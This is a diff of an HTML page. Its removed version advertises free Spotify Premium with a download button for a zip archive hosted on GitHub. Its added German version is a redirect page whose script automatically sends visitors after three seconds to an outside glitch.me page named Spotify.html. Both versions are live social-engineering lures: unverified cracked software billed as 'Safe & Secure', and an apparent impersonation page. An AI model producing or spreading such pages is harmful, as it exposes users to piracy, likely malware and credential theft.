@@ -1,148 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spotify Premium Experience</title>
+    <title>Weiterleitung...</title>
     <style>
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
         body {
-            font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 0;
-            background: url('https://community.spotify.com/t5/image/serverpage/image-id/155935i83B7FE910781C01E?v=v2') no-repeat center center fixed;
-            background-size: cover;
-            position: fixed;
-            width: 100%;
-            height: 100%;
-        }
-        
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            z-index: 0;
-        }
-        
-        .container {
-            max-width: 900px;
-            margin: 50px auto;
-            padding: 50px;
-            background: rgba(0, 0, 0, 0.9);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            position: relative;
-            overflow: hidden;
-            animation: slideUp 1s ease-out;
-            z-index: 1;
-        }
-        h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #1DB954;
-            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.2);
-        }
-        p {
-            font-size: 22px;
-            margin-bottom: 40px;
-            line-height: 1.6;
-            color: #e0e0e0;
-        }
-        .download-button {
-            display: inline-block;
-            padding: 18px 45px;
-            background: #1DB954;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1DB954, #0f8a44);
+            font-family: Arial, sans-serif;
+            text-align: center;
             color: white;
-            font-size: 22px;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        h1 {
+            margin-bottom: 20px;
+        }
+
+        .button {
+            padding: 12px 20px;
+            background: #1DB954;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
             font-weight: bold;
             text-decoration: none;
-            border-radius: 50px;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            display: inline-block;
+            transition: 0.3s;
         }
-        .download-button:hover {
+
+        .button:hover {
             background: #17a74b;
-            transform: scale(1.05);
-        }
-        .features {
-            display: flex;
-            justify-content: space-around;
-            margin-top: 50px;
-        }
-        .feature {
-            flex: 1;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            box-shadow: 0 5px 10px rgba(0,0,0,0.2);
-            margin: 10px;
-            transition: transform 0.3s ease;
-        }
-        .feature:hover {
-            transform: translateY(-5px);
-        }
-        .why-choose {
-            margin-top: 50px;
-            padding: 30px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            box-shadow: 0 5px 10px rgba(0,0,0,0.2);
-        }
-        .why-choose h2 {
-            font-size: 32px;
-            margin-bottom: 20px;
-            color: #1DB954;
-        }
-        .why-choose ul {
-            list-style: none;
-            padding: 0;
-        }
-        .why-choose ul li {
-            font-size: 20px;
-            margin: 10px 0;
-            color: #e0e0e0;
         }
     </style>
 </head>
 <body>
-    <div class="overlay"></div>
     <div class="container">
-        <h1>Experience Spotify Without Limits</h1>
-        <p>Enjoy your favorite music ad-free and in the highest quality – for free.</p>
-        <a href="https://github.com/monkeySpotBat/freeSpotiy-Premium/raw/main/moon++.zip" class="download-button">Download Now</a>
-        <div class="features">
-            <div class="feature">
-                <p>✔ 100% Working</p>
-            </div>
-            <div class="feature">
-                <p>✔ Safe & Secure</p>
-            </div>
-            <div class="feature">
-                <p>✔ Ultra-Fast</p>
-            </div>
-        </div>
-        <div class="why-choose">
-            <h2>Why Choose Us?</h2>
-            <ul>
-                <li>✅ No Ads, Just Music</li>
-                <li>✅ High-Quality Audio Streaming</li>
-                <li>✅ Easy Installation & Free Updates</li>
-                <li>✅ Free on PC</li>
-		<li>❌ Free on IOS</li>
-		<li>❌ Free on ANDROID</li>
-            </ul>
-        </div>
+        <h1>Du wirst weitergeleitet...</h1>
+        <p>Falls die automatische Weiterleitung nicht funktioniert, klicke auf den Button:</p>
+        <a href="https://jeweled-rebel-hyssop.glitch.me/Spotify.html" class="button">Weiter zu Spotify</a>
     </div>
+
+    <script>
+        setTimeout(() => {
+            window.location.href = "https://jeweled-rebel-hyssop.glitch.me/Spotify.html";
+        }, 3000); // 3 Sekunden Verzögerung
+    </script>
 </body>
 </html>
